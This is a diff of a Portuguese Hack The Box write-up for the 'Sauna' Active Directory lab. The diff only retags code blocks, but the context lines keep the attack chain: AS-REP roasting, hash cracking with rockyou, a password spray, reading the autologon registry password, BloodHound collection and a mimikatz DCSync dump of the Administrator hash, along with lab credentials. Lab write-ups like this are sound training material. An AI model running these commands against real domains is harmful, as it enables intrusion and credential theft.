@@ -31,7 +31,7 @@ Como sempre, para qualquer PenTest, precisamos saber qual é o alvo. E o primeir
 
 ![Enumeração nmap allPorts](Assets/HTB-Windows-Easy-Sauna/Enum-nmap-allports.png)
 
-```powershell
+```bash
 nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49675,49676,49677,49700,49720 10.10.10.175 -vvv -oN enumeration/nmap-A.txt -Pn
 ```
 
@@ -107,7 +107,7 @@ Numa empresa, os usuários costumam ser identificados por primeira letra dos pri
 
 ![Web Server get users](Assets/HTB-Windows-Easy-Sauna/web-server-get-users.png)
 
-```powershell
+```bash
 cat users-full-name
 #>  Fergus Smith
 #>  Hugo Bear
@@ -162,7 +162,7 @@ Para isso existem diversas ferramentas. Para esta máquina irei utilizar uma que
 
 Ainda antes do attack AS-REP Roasting Attack, poderíamos tentar ver recursos SMB e RPC, que são mais rápidos. Mas adiento já que não se vai ver nada para ambos. No entanto, para futuros ataques, precisamos saber mais informações sobre a máquina... Durante a tentativa de conexão por SMB, é possível recolher informações sobre o nome do domínio, e assim informar o nosso /etc/hosts para que haja menos problemas nos ataques futuros.
 
-```powershell
+```bash
 crackmapexec smb 10.10.10.175
 #>  SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
 
@@ -171,7 +171,7 @@ echo -e "10.10.10.175\tegotistical-bank.local" >> /etc/hosts
 
 Voltando ao ataque!
 
-```powershell
+```bash
 GetNPUsers.py egotistical-bank.local/ -no-pass -usersfile users
 
 Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
@@ -185,14 +185,14 @@ Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
 
 O que é isso? **$krb5asrep$23$fsmith**... é o tal TGT do usuário fsmith! Agora, se a palavra pass estiver no rockyou.txt (Lista enorme de palavras passes que, em seu tempo, vazou na internet), é pssível crackear esse TGT com a ajuda da ferramenta "John the Ripper".
 
-```powershell
+```bash
 nano fsmith_hash  # paste the hash and save...
 john --wordlist=/usr/share/wordlists/rockyou.txt fsmith_hash  # Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
 ```
 
 Já temos uma credencial. Temos de validá-lo! Para isso, o crackmapexec é muito útil!
 
-```powershell
+```bash
 # Sabemos que o serviço SMB está activo.
 crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
 
@@ -219,7 +219,7 @@ O Crackmapexec nos diz que as credenciais estão válidas para ambos os serviço
 
 Sabemos que é um Active Directory / Domain Controller. A primeira coisa a fazer num AD/DC é enumerar todos os usuários. Existem 2 tipos de usuários. Usuários Locais, e usuários de domínio. Para enumerar os usuários locais, podemos efectuar um "net users":
 
-```powershell
+```bash
 net users
 #>
 #>  User accounts for \\
@@ -235,7 +235,7 @@ O segundo passo é ver se existem passwords por defeito. Esta máquina é uma si
 
 Poderíamos utilizar o winPEAS64.exe para obter esta informação, mas com uma única linha de commando, podemos abrir o REG do "autologon" e descobrir a tal password por defeito...
 
-```powershell
+```bash
 cmd /c 'reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON"'
 
 #>  ...
@@ -245,7 +245,7 @@ cmd /c 'reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSI
 
 Com essa password, podemos efectuar um ataque de spray a todos os usuários para tentar ver se algum tem essa password... Existem montes de ferramentas, mas vamos tentar sempre usar ao máximo as ferramentas que já utilizamos. Crackmapexec! (E não esquecer que para esta máquina, utilizamos o crackmapexec tanto em modo SMB como WINRM por esse 2 serviços estarem ligados e operaionais!)
 
-```powershell
+```bash
 crackmapexec smb 10.10.10.175 -u users -p 'Moneymakestheworldgoround!'
 #> SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
 #> SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\fsmith:Moneymakestheworldgoround! STATUS_LOGON_FAILURE
@@ -278,7 +278,7 @@ Mesma história... Este novo usuário tem privilégios para aceder à máquina v
 
 Já dentro da máquina, Mesmo tendo um shell verdadeiro e tal, nunca é fácil ver tudo rapidamente, nem é fácil saber por que caminho ir... Para além da mencionada ferramenta winPEAS64.exe, disponível no github, hà uma ferramenta espetacular para visualizar em modo gráfico todos os ramos entre usuários e groupos de todo um domain controller! Esta ferramenta é a **BloodHound**. O programa precisa de uma base de dados, o neo4j, que é uma base de dados graph.
 
-```powershell
+```bash
 sudo neo4j start
 
 bloodhound &>/dev/null &
@@ -288,7 +288,7 @@ Agora que dados por nessa base de dados?!
 
 Existem também diversas ferramentas lol (como quase tudo em PenTesting), mas acho que a mais cómoda e de forma totalmente remota desde o meu Kali-Linux é com a ferramenta **_"bloodhound-python"_**
 
-```powershell
+```bash
 bloodhound-python -c All -u fsmith -p 'Thestrokes23' -d egotistical-bank.local -ns 10.10.10.175 -dc egotistical-bank.local
 ```
 
@@ -308,12 +308,12 @@ Essa vulnerabilidade existe porque o usuário svc_loanmgr tem privilégios de DS
 
 # Escalada de Privilégios
 
-```powershell
+```bash
 # Atenção ao link... só posso garantir estar válido AGORA MESMO enquanto escrevo...
 wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip
 ```
 
-```powershell
+```bash
 # Evil-winrm tem uma opção de upload... (Não é perciso certutil.exe, ou IWR, ou outras formas de transferir ficheiros)
 upload mimikatz.exe
 .\mimikatz.exe 'lsadump::dcsync /domain:egotistical-bank.local /user:Administrator' exit
@@ -345,7 +345,7 @@ A resposta é comprida... mas pelo meio encontra-se o Hash NTML do usuário de d
 
 E já somos donos de todo o Domain Controller! Podemos fazer o que quisermos... Agora podemos facilmente ver as flags...
 
-```powershell
+```bash
 cmd /c 'dir /r /s root.txt user.txt'  # As flags encontram-se repetidos e diferentes locais. Para não se procurar muito manualmente lool
 type 'C:\Users\Administrator\Desktop\root.txt'
 #>  1e5fcd4ecf49643b2ef3cf..........
